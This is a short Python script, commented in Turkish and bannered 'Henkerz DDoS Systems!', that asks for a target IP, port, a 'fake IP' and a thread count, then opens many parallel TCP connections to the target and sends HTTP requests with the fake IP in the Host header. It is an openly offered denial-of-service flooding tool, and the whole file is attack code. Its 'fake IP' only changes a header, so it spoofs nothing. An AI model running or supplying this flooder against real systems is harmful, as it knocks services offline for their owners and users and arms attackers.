import threading
import pyfiglet
import socket
import time

def show_ascii_opening_screen():
    ascii_art = pyfiglet.figlet_format("Henkerz DDoS Systems!", font="drpepper")
    print(ascii_art)
    time.sleep(1)

def opening():
    show_ascii_opening_screen()
    
def get_user_input():
    while True:
        target = input("Hedef IP adresi: ")
        try:
            port = int(input("Hedef port: "))
            fake_ip = input("Sahte IP adresi: ")
            num_threads = int(input("Thread sayısı: "))
            break
        except ValueError:
            print("Hatalı giriş. Port ve thread sayısı bir tam sayı olmalıdır.")

    return target, port, fake_ip, num_threads

def attack(target, port, fake_ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
    except Exception as e:
        print(f"Hata: {e}")

def start_attack(target, port, fake_ip, num_threads):
    thread_list = []

    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target, port, fake_ip))
        thread_list.append(thread)
        thread.start()
        
    print("Saldırı başlatıldı. Lütfen bekleyiniz...")

    # Thread'leri beklemek için tanınan zaman..
    time.sleep(5)

    # Thread listesi, tüm alt thread'lerin bitmesini bekler.
    for thread in thread_list:
        thread.join()

if __name__ == "__main__":
    opening()
    # Kullanıcıdan giriş al.
    target, port, fake_ip, num_threads = get_user_input()

    start_time = time.time()

    # Saldırıyı başlat.
    start_attack(target, port, fake_ip, num_threads)

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(f"Saldırı {elapsed_time} saniyede tamamlandı.")